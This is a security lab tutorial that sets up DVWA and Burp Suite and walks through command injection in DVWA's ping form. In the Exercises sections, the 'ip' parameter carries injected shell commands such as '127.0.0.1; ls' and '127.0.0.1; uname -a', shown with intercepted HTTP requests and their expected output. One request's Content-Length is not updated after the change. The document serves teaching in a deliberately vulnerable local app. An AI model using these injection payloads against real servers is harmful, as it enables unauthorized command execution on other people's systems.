# Project 4: Finding and Exploiting Command Injection Flaws using DVWA

## Introduction
Command Injection is a web security vulnerability that allows attackers to execute arbitrary system commands on the underlying server. This can lead to unauthorized access, data theft, and system compromise. In this project, you will learn how to identify and exploit Command Injection vulnerabilities using DVWA (Damn Vulnerable Web Application) and Burp Suite.

## Pre-requisites
- Basic understanding of web application concepts and the HTTP protocol.
- Familiarity with command line interfaces (CLI).
- A working installation of DVWA and Burp Suite Community Edition.

## Lab Set-up

### Setting up DVWA
1. **Install XAMPP**:
   - Download XAMPP from [Apache Friends](https://www.apachefriends.org/index.html) and install it.
   - Start the Apache and MySQL services from the XAMPP control panel.

2. **Install DVWA**:
   - Download DVWA from [GitHub](https://github.com/digininja/DVWA).
   - Extract the DVWA files into the `htdocs` directory of your XAMPP installation (e.g., `C:\xampp\htdocs\DVWA`).

3. **Configure DVWA**:
   - Open `config` directory inside DVWA (`C:\xampp\htdocs\DVWA\config`) and rename `config.inc.php.dist` to `config.inc.php`.
   - Edit `config.inc.php` and set the following database configurations:
     ```php
     $_DVWA['db_user'] = 'root';
     $_DVWA['db_password'] = '';
     $_DVWA['db_database'] = 'dvwa';
     ```

4. **Set up the DVWA Database**:
   - Open a web browser and navigate to `http://localhost/DVWA/setup.php`.
   - Click on the "Create / Reset Database" button to set up the database.
   - Log in to DVWA with the default credentials:
     ```
     Username: admin
     Password: password
     ```

### Setting up Burp Suite
1. **Download and Install Burp Suite**:
   - Download Burp Suite Community Edition from [PortSwigger](https://portswigger.net/burp/communitydownload) and install it.

2. **Configure Burp Suite with your Browser**:
   - Open Burp Suite and go to the "Proxy" tab.
   - Click on "Intercept is on" button to toggle interception off.
   - Go to the "Options" sub-tab and ensure the proxy listener is running on 127.0.0.1:8080.
   - Configure your web browser to use Burp Suite as a proxy (set the proxy server to 127.0.0.1 and port 8080).

## Exercises

### Exercise 1: Identifying Command Injection Vulnerabilities

1. **Set DVWA Security Level to Low**:
   - Log in to DVWA and go to the "DVWA Security" section.
   - Set the security level to "Low" and click "Submit".

2. **Navigate to Command Injection Section**:
   - Go to the "Command Injection" section in DVWA.

3. **Intercept the Request with Burp Suite**:
   - Enter an IP address (e.g., `127.0.0.1`) and click "Submit".
   - Burp Suite will intercept the request. Forward the request to see the result.

4. **Modify the Request to Exploit Command Injection**:
   - Intercept the request again and modify the `ip` parameter to execute an arbitrary command (e.g., `127.0.0.1; ls`).
   - Forward the modified request and observe the response.

### Commands and Expected Output

1. **Initial Request Interception**:
   - Request intercepted by Burp Suite:
     ```
     POST /DVWA/vulnerabilities/exec/ HTTP/1.1
     Host: localhost
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 27

     ip=127.0.0.1&submit=Submit
     ```

2. **Modified Request with Command Injection**:
   - Modify the intercepted request:
     ```
     POST /DVWA/vulnerabilities/exec/ HTTP/1.1
     Host: localhost
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 27

     ip=127.0.0.1; ls&submit=Submit
     ```
   - Expected output: The response should list the contents of the directory on the server.

### Exercise 2: Exploiting Command Injection to Execute Commands

1. **Crafting Command Injection Payloads**:
   - Use payloads to execute arbitrary commands. For example, to display system information:
     ```
     127.0.0.1; uname -a
     ```

2. **Expected Output**:
   - The response should display system information such as the operating system and kernel version.

